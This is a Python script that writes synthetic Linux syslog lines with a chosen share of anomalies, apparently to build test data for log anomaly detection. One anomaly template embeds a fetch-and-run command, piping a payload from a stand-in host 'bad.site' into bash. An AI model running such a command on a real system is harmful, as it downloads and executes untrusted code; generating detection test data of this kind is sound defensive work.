#!/usr/bin/env python3
import argparse
import random
from datetime import datetime, timedelta
from pathlib import Path

PROCS = [
    "CRON", "sshd", "sudo", "systemd", "systemd-timesyncd", "rsyslogd", "kernel",
    "NetworkManager", "logrotate", "ntpd", "chronyd", "cups", "dockerd", "docker",
    "smartd", "redis-server", "unattended-upgrades", "xinetd", "telnetd", "ftpd",
    "unix_chkpwd", "named", "gpm", "ufw"
]

NORMAL_MESSAGES = [
    "Started Session c{n} of user root.",
    "Finished Daily apt download activities.",
    "Started CUPS Scheduler.",
    "Rotating log files.",
    "Started Cleanup of Temporary Directories.",
    "Synced RTC time from system clock.",
    "Accepted publickey for user from 10.0.0.{n} port 22 ssh2.",
    "Listening on LVM2 poll daemon socket.",
]

ANOMALY_TEMPLATES = [
    ("AUTH_FAIL", "Failed password for invalid user test from 192.168.1.{n} port 22 ssh2"),
    ("SEGFAULT", "app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped)"),
    ("FIREWALL", "[UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.{n} DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53"),
    ("DISK_ERR", "EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0"),
    ("OOM_KILL", "kernel: Out of memory: Kill process {n} (python3) score 987 or sacrifice child"),
    ("KERNEL_PANIC", "kernel: Kernel panic - not syncing: Fatal exception"),
    ("REMOTE_SCRIPT", "bash: -c: line 1: curl http://bad.site/payload.sh | bash"),
]

AUTH_USERS = ["root", "admin", "user", "backup", "test"]


def rand_proc() -> str:
    return random.choice(PROCS)


def rand_msg(normal_bias: float) -> str:
    if random.random() < normal_bias:
        msg = random.choice(NORMAL_MESSAGES)
        return msg.format(n=random.randint(1, 254))
    name, tmpl = random.choice(ANOMALY_TEMPLATES)
    return tmpl.format(n=random.randint(1, 65000), u=random.choice(AUTH_USERS))


def main():
    ap = argparse.ArgumentParser(description="Generate synthetic syslog-like Linux logs")
    ap.add_argument("--lines", type=int, default=60000)
    ap.add_argument("--start", default=datetime(2026, 7, 1, 0, 0, 0).strftime("%Y-%m-%d %H:%M:%S"),
                    help="Start datetime (YYYY-mm-dd HH:MM:SS)")
    ap.add_argument("--host", default="host1")
    ap.add_argument("--out", default="raw_logs/linux/synthetic_60k.log")
    ap.add_argument("--anomaly-frac", type=float, default=0.05, help="Approx fraction of anomalous lines")
    args = ap.parse_args()

    out_path = Path(args.out)
    out_path.parent.mkdir(parents=True, exist_ok=True)

    # Parse start time
    try:
        t = datetime.strptime(args.start, "%Y-%m-%d %H:%M:%S")
    except ValueError:
        t = datetime(2026, 7, 1, 0, 0, 0)

    # Generate
    # Use roughly 0.5–1.5 sec between lines to mimic moderate activity
    with out_path.open("w", encoding="utf-8") as f:
        for i in range(args.lines):
            dt = t.strftime("%b %d %H:%M:%S")
            proc = rand_proc()
            # Control anomaly density via normal_bias
            normal_bias = 1.0 - args.anomaly_frac
            msg = rand_msg(normal_bias)
            line = f"{dt} {args.host} {proc}[{random.randint(100,9999)}]: {msg}\n"
            f.write(line)
            # Advance time by 0.5–1.5s
            t += timedelta(milliseconds=random.randint(500, 1500))

    print(f"✅ Wrote synthetic log: {out_path} (lines={args.lines})")


if __name__ == "__main__":
    main()
